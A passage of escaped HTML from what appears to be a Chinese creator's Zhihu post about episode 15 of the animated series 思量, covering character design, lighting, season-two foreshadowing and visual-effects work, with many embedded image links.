data-private-watermark-src=\"v2-6d2109038dee3d77ce19f6f4b4618115\"></p>\n<p>这个镜头设计光影的时候故意让玄哥从树阴中走出，好有一个身形到光影的塑造，主要是想突显儿子的气场十足，灯光中途改了几版，最后实现出的效果也很不错。(之前分享过两次灯光设计了，这次就不再赘述了)</p>\n<p><img src=\"https://pic3.zhimg.com/v2-47b26b416c34d1b348788e09777a11a5_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-47b26b416c34d1b348788e09777a11a5\" data-watermark-src=\"v2-20b0bb8007224f5a4e46c7e360dbff5f\" data-private-watermark-src=\"v2-e250d4b95c67f06c50feea4ce6d62e45\"></p>\n<p>我对玄哥第一季寄予的状态表达是“强大”、“破碎感”以及“正”，这几种观感建立在他如今的心态和世界观认知之上。对真相的执着让他的年轻炽烈和深沉隐忍交织，行成独特的人格魅力。我在开播前说过，希望我能将脑海中迭代多年，那个让我哭让我笑的玄哥表现好，将他从脑电波中带到我所在的现实世界来，让大家也能看到这个有很多面的男孩。</p>\n<p>开播后收到很多观众对玄哥喜爱的表达，是之前完全没想到的，老母亲很欣慰´◡`，毕竟我这个人审美比较极端，且由于太过铁直，自认为苏点也是奇奇怪怪的，平时工作忙碌没时间结交同好并交流，这次做思量也是和观众们交流的途径，收获满满(^з^)-☆</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3e2521c9e1e9acea9b428e21a76936ea_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-3e2521c9e1e9acea9b428e21a76936ea\" data-watermark-src=\"v2-592b2f3370001e61595a49f2234d38b4\" data-private-watermark-src=\"v2-0650c994cfa4d7755478356e4bd6bafe\"></p>\n<p>现场调动画时顺便让儿子用手比了个心，当做收官贺了ヾ(❀╹◡╹)ﾉ~</p>\n<p><img src=\"https://pic3.zhimg.com/v2-86a6c5f8e15027143116836d100d7139_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-86a6c5f8e15027143116836d100d7139\" data-watermark-src=\"v2-42c3f9faa153f37459232655890e8544\" data-private-watermark-src=\"v2-ed9e44a684d44b3300c52bb3a39b618e\"></p>\n<p>而丽崽是我对女主塑造的一种执念，这种执念深埋脑海多年，终于在自己的作品里实践了一次，希望通过屠丽这个角色来展现一种靠自身努力和经历，完成从平凡到非凡的成长，一如自己从小到大的历程吧。在我看来普通出身的女孩照样可以乘风破浪、活出精彩ヾ ^v^♪</p>\n<p>15集可以说是丽状态塑造非常丰富多层次的一集(｡◝ᴗ◜｡)。首先，开始时她是具备防范意识的，不会因为被救过或者帅就让双商彻底下线，丝毫不去思考危险系数。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1006d1c40951582928837a86e4f977e9_720w.jpg?rss\" data-rawwidth=\"2036\" data-rawheight=\"1142\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-1006d1c40951582928837a86e4f977e9\" data-watermark-src=\"v2-1b4ec08f6f317061e09c6cdcfd847c25\" data-private-watermark-src=\"v2-bd420d7333e1019031e9c56a5d86ea1b\"></p>\n<p>在我看来，对于刚见面的陌生人，一见钟情是感受问题，而无条件信任是原则问题。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cb00933ae244ed9ee232e480c739c193_720w.jpg?rss\" data-rawwidth=\"2038\" data-rawheight=\"1140\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-cb00933ae244ed9ee232e480c739c193\" data-watermark-src=\"v2-6e427bbdde0defb948763ecb27cc5cf2\" data-private-watermark-src=\"v2-d3c92d382f4ddb501ea4f2abe266609e\"></p>\n<p>就像对萧霁，丽崽虽不信任，但短期目标相同(都要去凡间)，她就会揣着明白装糊涂，静观事情发展再见机行事。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-74f1f04405c016db693081dfc203f042_720w.jpg?rss\" data-rawwidth=\"2168\" data-rawheight=\"1222\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-74f1f04405c016db693081dfc203f042\" data-watermark-src=\"v2-03d4f85f38fa676bb8210a9e22a6ea74\" data-private-watermark-src=\"v2-1733ee48e698a1c268cf7e55b49dc06d\"></p>\n<p>且对于一拳就能解决的凡人同乡，她有控局权，不需太介怀。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-d3614a8cbd38f3ba4910e9b18a623c23_720w.jpg?rss\" data-rawwidth=\"1872\" data-rawheight=\"1058\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d3614a8cbd38f3ba4910e9b18a623c23\" data-watermark-src=\"v2-a1c1e8c2395fc2a82cff827eb02335db\" data-private-watermark-src=\"v2-bdfb18ca6b202d06c0847e8a16b896a7\"></p>\n<p>但这次面对实力深不见底的强大男神玄哥，从丽“刚认识”的视角保持警惕是必要的。对于信任这点，丽崽的节奏把握的很明确。并不会因为人帅就失了自己判断的准则。两人一起多经历几件事，她对玄哥的信任自然而然就会建立稳固了。</p>\n<p>而镜玄目前也带着阴谋滤镜在看萧霁，他对萧霁的不信任需要经历更多才能化解，总之萧霁后面的路定不好走(ಡωಡ)帮忙遮掩图纸的玄哥，以及有意放水的眠眠，都不是可以轻易蒙混过关的，替乐天阳光的小侯爷祈祷´∀`</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8b6f60c4b7cdcdccd9a1d0731d1b1402_720w.jpg?rss\" data-rawwidth=\"2074\" data-rawheight=\"1168\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-8b6f60c4b7cdcdccd9a1d0731d1b1402\" data-watermark-src=\"v2-84a69c60727a0cf0c5a422174878344e\" data-private-watermark-src=\"v2-21c55edc14a872864d9f32e730092d8b\"></p>\n<p>(PS，插句无关作品的题外话，现实不同于影视作品，女孩子更要对危险保持理智和警惕，不要被表象迷惑轻信他人。)</p>\n<p>说回作品，这里还有个小细节不知大家是否注意到了，丽崽幻想中玄哥用的是火，而实际玄哥招数是冰。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2329088611441f32d5656008b1ea2260_720w.jpg?rss\" data-rawwidth=\"2038\" data-rawheight=\"1138\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-2329088611441f32d5656008b1ea2260\" data-watermark-src=\"v2-e5085e4ac0197a835acf1de2c60a71b0\" data-private-watermark-src=\"v2-495198c952142f508d9d58bd9c1b47fe\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-c7b68d142299d53ce09b5a5a03259b7e_720w.jpg?rss\" data-rawwidth=\"2036\" data-rawheight=\"1152\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c7b68d142299d53ce09b5a5a03259b7e\" data-watermark-src=\"v2-87013e2cdd75d2b3098fabd056d7447c\" data-private-watermark-src=\"v2-a363e05d102e5b40451642f28ca7f73e\"></p>\n<p>这里也是侧面突显丽对火的惧怕，当年差点在觞家大火中遇险，以及平时被程家火球为难的次数较多，所以应激反应中第一时间想到的就是火球这个威胁，这点设置应该是很容易理解的吧。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a1d29e0cea3e85bff400292088ff12ab_720w.jpg?rss\" data-rawwidth=\"2442\" data-rawheight=\"1370\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a1d29e0cea3e85bff400292088ff12ab\" data-watermark-src=\"v2-435bccd051d01540f1437bdec6c7ae8b\" data-private-watermark-src=\"v2-d5aaa4f72f2cd6a758a0decb7ead3dd1\"></p>\n<p>但实际上玄哥完全不会火系法术=v=</p>\n<p>所以才多年仍学不会眠眠的那些法术，只能自己默默看书体悟修行。也导致若镜玄有意隐瞒，奉眠对他的真正实力无从知晓，这也是伏笔之一。而且以玄哥的品行来讲，一般情况不会对老人、女士及孩子动手。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-44b4ad44e741a95438ebbfc1a29057de_720w.jpg?rss\" data-rawwidth=\"2046\" data-rawheight=\"1146\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-44b4ad44e741a95438ebbfc1a29057de\" data-watermark-src=\"v2-676fe65d4e0a20222889ab5721b36578\" data-private-watermark-src=\"v2-bbdc726b6566e36bbfaf3de494c44db5\"></p>\n<p>后面出现的这个圈就是西游记的梗了，儿时看了太多遍导致编剧时自然而然就用上了，借此致敬一下儿时最爱的神话剧(^з^)-☆</p>\n<p>山路戏中，我加入了不少相处小细节，大家可以自己去翻看，比如这里，</p>\n<p><img src=\"https://pic3.zhimg.com/v2-12715e392a505f50894b675dfa2078dc_720w.jpg?rss\" data-rawwidth=\"2282\" data-rawheight=\"1286\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-12715e392a505f50894b675dfa2078dc\" data-watermark-src=\"v2-b7d3128e15b919657e12bed230594553\" data-private-watermark-src=\"v2-b86e96dfc1c5c398245c5b2e74606c0e\"></p>\n<p>走路差点撞到又后退站好。是我的苏点~&gt;_&lt;~，而且对于就算差了个台阶，玄哥依然比丽崽高，这点也是我的苏点::&gt;_&lt;::，于是编的时候就放进去了，不知道有没有人和我奇奇怪怪的苏点一致呢（ '▿ ' ）。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ebb6dd973ac2b028216afbde7df9d548_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-ebb6dd973ac2b028216afbde7df9d548\" data-watermark-src=\"v2-5137cb064e3f5e78821c1dbeb5e6be71\" data-private-watermark-src=\"v2-7ab7169c7e19bd8780b9161aaaf0c7fb\"></p>\n<p>以及玄自然而然的护住丽的头防止她撞到树。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-b0235787cbfc6674c8a586dac442b405_720w.jpg?rss\" data-rawwidth=\"2270\" data-rawheight=\"1270\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-b0235787cbfc6674c8a586dac442b405\" data-watermark-src=\"v2-d675476ca8541904ea0756cce2337a8e\" data-private-watermark-src=\"v2-b38ed0c971ebdfc764f833105de4e0be\"></p>\n<p>还记得给动画师现场讲戏的时候，动画师get到我设计的点后，一脸笑的很懂的样子罒ω罒对我说了句：“要是现实中有这样的人，就很想嫁啊。”</p>\n<p>我：“´∀`……这种情节只存在于脑洞里吧。”</p>\n<p><img src=\"https://pic4.zhimg.com/v2-dc20d4777b9da15456a9569d95b1ec7b_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-dc20d4777b9da15456a9569d95b1ec7b\" data-watermark-src=\"v2-c5cf638fa707289f1a19b11fa8b29f21\" data-private-watermark-src=\"v2-cd02ec7e46f3afbdf7d3c42bf51f2000\"></p>\n<p>还有这集里丽崽面对玄时，有时说话状态比以前多了些少女感，还有点小别扭~体现在她的表情和动作中，跟动捕演员讲了半天还演示了下，会有如此反常表现皆因眼前人是喜欢的人(ꈍᴗꈍ)她就紧张了。</p>\n<p>这个估计有过类似经历的女孩更能感受到吧，比如我就是⁄(⁄ ⁄•⁄ω⁄•⁄ ⁄)⁄。。。高中时遇到暗恋的人，表情和动作难以自持的情景至今刻在脑内，不知算不算典型，唉都是羞死人的回忆::&gt;_&lt;::艺术创作果然都是来源于生活体验。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-809092baad07c895781df78b6b262d96_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-809092baad07c895781df78b6b262d96\" data-watermark-src=\"v2-dcd7d4e3eaf51613f8c711937ca55948\" data-private-watermark-src=\"v2-4932c21828291a61786412fe852ee2fa\"></p>\n<p>大家应该也注意到阿炫制香室墙上的“化学元素周期表”了，作为彻头彻尾理科生的执着就在于此了(*/ω＼*)，至今还保留了默写周期表、原子量以及背化学价公式的习惯，中学时非常喜欢行云流水的写化学反应方程，当时觉得那都不是需要背的内容，就像顺其自然发生的化学反应一样顺着思路就推衍出了，应该是学出语感的感觉吧。理化生三门课程至今是我的最爱::&gt;_&lt;::大学死磕动画软件压力太大时，还曾拿高中的生物试卷答题缓解压力调整状态。</p>\n<p>就像我在模型制作中加入对基因遗传学的理解：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-18709b2924de346e5a116fa32bc80fbf_720w.jpg?rss\" data-rawwidth=\"1936\" data-rawheight=\"1086\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-18709b2924de346e5a116fa32bc80fbf\" data-watermark-src=\"v2-bede1604227c379bffe9aa1647a5f053\" data-private-watermark-src=\"v2-c4481f52967f966282ad3c9e6020e66f\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-a9af4e2a52683fbc6d0bdbde031821fb_720w.jpg?rss\" data-rawwidth=\"1942\" data-rawheight=\"1084\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a9af4e2a52683fbc6d0bdbde031821fb\" data-watermark-src=\"v2-25f78d1a8ce02bee6f274783e2064770\" data-private-watermark-src=\"v2-49032cf5cd10f549808465ae9d1a9541\"></p>\n<p>也希望我喜欢的物理化学知识后续也能逐步融入到思量的世界观当中(ღˇ◡ˇღ)。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-53af1c6d8de2afed5d2cc0ad7c5f89ac_720w.jpg?rss\" data-rawwidth=\"2376\" data-rawheight=\"1306\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-53af1c6d8de2afed5d2cc0ad7c5f89ac\" data-watermark-src=\"v2-c05785cdd84bbb47b9fbda9d2231f4b9\" data-private-watermark-src=\"v2-133922c5f091b3da338a1f206c3f0bba\"></p>\n<p>关于玻璃容器的存在我觉得在幻想世界还挺正常的，玻璃是石头经过高温加工制成，程家主火，多高的温度都不在话下，所以无论是主业锻造兵器还是制做一些玻璃瓶瓶罐罐，对火属性的家族来说都是信手拈来。</p>\n<p>程炫对香术的深入研究也让他对神族气场有了别人都没有的感知。这对第二季的剧情进展也是重要伏笔。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2db546e8d1b24b80b89d8e1e18f2e6ef_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-2db546e8d1b24b80b89d8e1e18f2e6ef\" data-watermark-src=\"v2-d7076bddd60d64a997382d1d5f01aafa\" data-private-watermark-src=\"v2-7f6b02f18a309b9478a1b426259aefbd\"></p>\n<p>而程染先惊讶又冷静下来轻描淡写的让阿炫别操心不该管的事，也侧面反应了此事程染也知情，且了解阿炫不是会贸然乱说之人。这方面理解多少就看观众们的感知了，更详细的情节待第二季揭开。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-de9a6ff980aa79af2c721d64e968ea6d_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-de9a6ff980aa79af2c721d64e968ea6d\" data-watermark-src=\"v2-c0f059bf93b96db020c0aefc08211b63\" data-private-watermark-src=\"v2-78bb015c4d4758d01e0e52ec25aac2e7\"></p>\n<p>而程家老爷子也在星宿阵中缓缓睁眼似在酝酿事端，必是为第二季强阻力做准备。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a8ed46179f023dafc2444b630ab02abd_720w.jpg?rss\" data-rawwidth=\"2380\" data-rawheight=\"1332\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a8ed46179f023dafc2444b630ab02abd\" data-watermark-src=\"v2-b5ece6757e4e79487f503aeccdd9d1b0\" data-private-watermark-src=\"v2-b743479d819a8dbf6e36c9747b665911\"></p>\n<p>相比程家的运筹帷幄、隐患潜藏，须家则是些许乌龙，在救命恩人buff滤镜叠加的基础上又误会了灵犀喜对镜玄有好感。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0d44c818f5cd9f842bd01c1f37fa8590_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-0d44c818f5cd9f842bd01c1f37fa8590\" data-watermark-src=\"v2-3728c8c05dd3bdedf34815033de01a63\" data-private-watermark-src=\"v2-155cb8ae884131f8cd4e01ca4c6fabb2\"></p>\n<p>不过可以放心，并不影响两条感情线各自的发展。毕竟观众朋友们现实生活中，自己心里真的对谁有感觉，也不会受家长胡乱猜测的影响吧。这个乌龙第二季就会解开，在思量这个剧里我有我的坚持，有感情线设置的都很明确了，没有的就是没有。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-605b759591857de51c52b7ca704d0bb5_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-605b759591857de51c52b7ca704d0bb5\" data-watermark-src=\"v2-518c91176f764cdb70494bd19ed6f7bd\" data-private-watermark-src=\"v2-462e701ff4a097468bd9847edbca05c3\"></p>\n<p>台词中可见，须家非常推崇法力，因程家尚武，所以明年天赎若失败，岛上笃信天赎的民众定会大大减少，甚至全面怀疑天赎，整岛格局大变动在所难免，是否还乖乖在望神节上供不好估计┐(´-｀)┌。处事温和派的须家优势大减。程家一直私下蠢蠢欲动想搞事情，须家虽有察觉，但因天赎前不想多生事端，所以一直维系表面和平。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-05c2cde91d57ba92f5feb770debc5ada_720w.jpg?rss\" data-rawwidth=\"1942\" data-rawheight=\"1082\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-05c2cde91d57ba92f5feb770debc5ada\" data-watermark-src=\"v2-3b75751e29fb1cc3930916384f19d67e\" data-private-watermark-src=\"v2-bebc0f49a9e4738a8be9232783ba4f99\"></p>\n<p>甚至动了和程家联姻的打算，天赎前打探举动是一方面，另一方面是为了天赎失败程家以武力在岛上得势时，须家还能借灵犀和程炫的关系有缓和余地，且玄哥出现之前，阿炫实为上上之选，对灵犀又恭敬如宾处处礼让。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6abfb9f8eb6717b42d0711eac3ba6e70_720w.jpg?rss\" data-rawwidth=\"1932\" data-rawheight=\"1076\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-6abfb9f8eb6717b42d0711eac3ba6e70\" data-watermark-src=\"v2-dea99ce261a94fce087eade078f872a2\" data-private-watermark-src=\"v2-2c021af0ff8495e9d9dff8f953c61329\"></p>\n<p>说到阿炫习惯礼让这点，大家或许还记得程熔说过灵犀在岛上未成年的这批孩子中法力最强，结合15集释出的剧情，大家可以猜测一下，同为岛上小辈翘楚的程炫和灵犀谁的法力更强Ծ ̮ Ծ，当年小辈法力比试的真相如何，而大少程炜在青年辈当中又是什么实力级的存在呢，更多信息第二季陆续揭晓。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-c7c66fea65641b04e50c869f8809b39b_720w.jpg?rss\" data-rawwidth=\"1940\" data-rawheight=\"1092\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c7c66fea65641b04e50c869f8809b39b\" data-watermark-src=\"v2-c2718547512177bf2a322841853fb822\" data-private-watermark-src=\"v2-62356d986ee5ae80287382102bc4b3fc\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2de165c57c33f704d90adf40f9cdde22_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-2de165c57c33f704d90adf40f9cdde22\" data-watermark-src=\"v2-4db75eb3346f1dda993d3c915551a2f7\" data-private-watermark-src=\"v2-d3d54ab9cb79ae5bb4b2da7c1e8a9019\"></p>\n<p>玄哥踏着轻快愉悦的步伐回到恒水居，这次回来真是相当不容易，玄哥怕是会有恍若隔世之感吧Ծ ̮ Ծ，这点从他窃喜的表情中可略窥一二。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9e097ba45bf6a0308226cac4fae0d38d_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-9e097ba45bf6a0308226cac4fae0d38d\" data-watermark-src=\"v2-c9ad466b79d7ca678737d2291a1b9b16\" data-private-watermark-src=\"v2-d9c4e720794cb1e34b6c07e632ca6ef7\"></p>\n<p>丽崽也开启新同居时代，同一屋檐下这回想必无论是生活还是心情都无法再似之前的平静安稳了&gt;_&lt;</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3f74ae1669af6bbf5bfb0f859b382af0_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-3f74ae1669af6bbf5bfb0f859b382af0\" data-watermark-src=\"v2-01b42df4160c3fc5e965b8d724cabcf3\" data-private-watermark-src=\"v2-540694317b1ababbbaef2feac0ae5ad8\"></p>\n<p>而且危机正潜伏在周围。。。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7605dfa62fa5832171a2b0183ad698cb_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-7605dfa62fa5832171a2b0183ad698cb\" data-watermark-src=\"v2-7f3b6c1904aaf137ee2abdc6a039139b\" data-private-watermark-src=\"v2-1dfdaffef49fba9ff78640e99b3635e8\"></p>\n<p>最后这一季的收尾和升华主题交给了我们拒知情为何物的眠眠，自从来到这个岛上，在她看来难以理解的事不断上演，当年坠海的夫妇，和追随而去的小孩，如今长大的两个孩子仍义无反顾。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9461f205668b8e31f9f42041e1799d10_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-9461f205668b8e31f9f42041e1799d10\" data-watermark-src=\"v2-9d1523c49d7bb43e3b62352aa5a5bd4b\" data-private-watermark-src=\"v2-63a9426a69afa9d0c86097fa01fa10d5\"></p>\n<p>但这岛上没人有足够的修为和身份能对她的修行进行指摘，比起陷在岛上凡人时间线里挣扎的众人，眠眠何尝不是陷在自己设立的无情道中进行着另一番挣扎呢。</p>\n<p>结尾封在水晶当中的夫妇二人，也会继续在第二季中揭开更多往事面纱。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-208497e02167b03decc8f57d19726591_720w.jpg?rss\" data-rawwidth=\"1710\" data-rawheight=\"960\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-208497e02167b03decc8f57d19726591\" data-watermark-src=\"v2-393df31416b43d9d070505a6f1da1ef6\" data-private-watermark-src=\"v2-ad51c5c404f7b371a5aeb79f57835dd0\"></p>\n<p>璎陌泪中带笑的表情k了好几轮都不达标，最后只能过去现场看着调，顺便把pose也调了，才得到如今比较满意的效果。前面的版本动作不像不舍离别，角度和表情也一言难尽~_~</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f7aa4d53f2c0b8b1f5c1e9a497d6b4f7_720w.jpg?rss\" data-rawwidth=\"526\" data-rawheight=\"542\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f7aa4d53f2c0b8b1f5c1e9a497d6b4f7\" data-watermark-src=\"v2-98473d31a9b0467daea7089e4c05d67f\" data-private-watermark-src=\"v2-9387bc850af77e8003951fac9d1b097c\"></p>\n<p>——————————————</p>\n<p>最后再分享下特效方面，第15集的特效工作量也是非常吓人的，是开播这几个月一直肝的内容之一，</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ce8771241c0ca8ee7214b73e2043d190_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-ce8771241c0ca8ee7214b73e2043d190\" data-watermark-src=\"v2-3e1f39010ab87dc57612c8e7d29cd355\" data-private-watermark-src=\"v2-8d746a5d2c7af404a06597baec264ba4\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b5436fff35cf95e6f711c795c3360192_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-b5436fff35cf95e6f711c795c3360192\" data-watermark-src=\"v2-da88108b2d1a5cf50967c4c328fa69e3\" data-private-watermark-src=\"v2-e56427751dafed518558198a0ce1d7fe\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c361d1de4a32dfdf7eafb022e9a24f60_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-c361d1de4a32dfdf7eafb022e9a24f60\" data-watermark-src=\"v2-4c2fd29d05cad0ee1c90f4a0acaaa365\" data-private-watermark-src=\"v2-3e0a0d0b30e64ef1937bc19c53271857\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-f310098408ad30e722550e3410b1560c_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-f310098408ad30e722550e3410b1560c\" data-watermark-src=\"v2-014277f392084e368622876cd18c3fc9\" data-private-watermark-src=\"v2-65f1748fd4b375656b273fc25b0094f9\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d3580ea8e6322c3fec67ffac9fe97502_720w.jpg?rss\" data-rawwidth=\"2048\" data-rawheight=\"1148\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d3580ea8e6322c3fec67ffac9fe97502\" data-watermark-src=\"v2-6069db99e2e2d9ab94c1b0437b33b168\" data-private-watermark-src=\"v2-62cb4af3a36299663d9f5e7c3df945b7\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-47fbbf28d691c3a356b6f7aad139dfe2_720w.jpg?rss\" data-rawwidth=\"2056\" data-rawheight=\"1158\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-47fbbf28d691c3a356b6f7aad139dfe2\" data-watermark-src=\"v2-465807fcc99b08350bb3289b698ac776\" data-private-watermark-src=\"v2-88aa9e27a07f922ec7a39e91c0b86836\"></p>\n<p>13和15集镜玄的招式打击特效是电影特效公司“几何二进制”完成的，制作周期横跨1年多，和负责人郭老师开会对到凌晨三、四点推敲特效实现细节是家常便饭。现在大家再看下面我这张工作截屏应该能分辨出是对应哪些镜头了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a06787323c135c8c5a62bb6af81c4833_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"697\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-a06787323c135c8c5a62bb6af81c4833\" data-watermark-src=\"v2-27b7d17d4da244240ab5b3aba3f9999d\" data-private-watermark-src=\"v2-ef1d90f8c33543971a3c3abe73bf1c1a\"></p>\n<p>13集大部分的自然雾气和全部的海水特效是吾立方内部完成的，效果也很不错。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-7d0951ea53e2de1b0ed10a8866b68b6d_720w.jpg?rss\" data-rawwidth=\"2164\" data-rawheight=\"1218\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-7d0951ea53e2de1b0ed10a8866b68b6d\" data-watermark-src=\"v2-489a3cc1a511970dcc0fa7b8ccf45f79\" data-private-watermark-src=\"v2-2fee46a95d08fcae10e6a2783e39bfb9\"></p>\n<p>有了几个公司的通力配合，才完成最终特效的完美呈现，而我的设计思路也给大家出了不少难题。</p>\n<p>可能是理科生的缘故，我对立体几何构成比较偏爱，审美也比较后现代，所以喜欢用凌厉的几何来表现法术，设计思路更未来感。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-003ee3e24cb649f433ddccf73dd982df_720w.jpg?rss\" data-rawwidth=\"1314\" data-rawheight=\"819\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-003ee3e24cb649f433ddccf73dd982df\" data-watermark-src=\"v2-07478716699948d5abd5989eec7291b0\" data-private-watermark-src=\"v2-cde9ad30437d0d404bc6d08813ae89c8\"></p>\n<p>且对特效发生的步骤要求比较细致，我觉得只有如此才能用特效讲好故事。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3a493ed69753edf043f60b9b694a606a_720w.jpg?rss\" data-rawwidth=\"992\" data-rawheight=\"1695\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-3a493ed69753edf043f60b9b694a606a\" data-watermark-src=\"v2-2ef531a61f8b1c87131e3e85f455ecae\" data-private-watermark-src=\"v2-d39afd22434303ec49458a45972cbcf0\"></p>\n<p>很多炎央做的特效效果设计图都会给到合成组做最终效果的合成参考。所以完成度必须很高。辛苦一起和我啃设计图的炎央美术组小伙伴(^з^)-☆</p>\n<p><img src=\"https://pic3.zhimg.com/v2-431d2bacca54047b45ca95d9c1f303f3_720w.jpg?rss\" data-rawwidth=\"1360\" data-rawheight=\"909\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-431d2bacca54047b45ca95d9c1f303f3\" data-watermark-src=\"v2-f4cf1e7ef38e9d608415401a2337d860\" data-private-watermark-src=\"v2-1d12864f5d2a48bb90347b68fd3753c6\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-932fc4618f22f53379c131dea9ec36dd_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"2439\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-932fc4618f22f53379c131dea9ec36dd\" data-watermark-src=\"v2-a77cb2887f534622c341f7009baa43a5\" 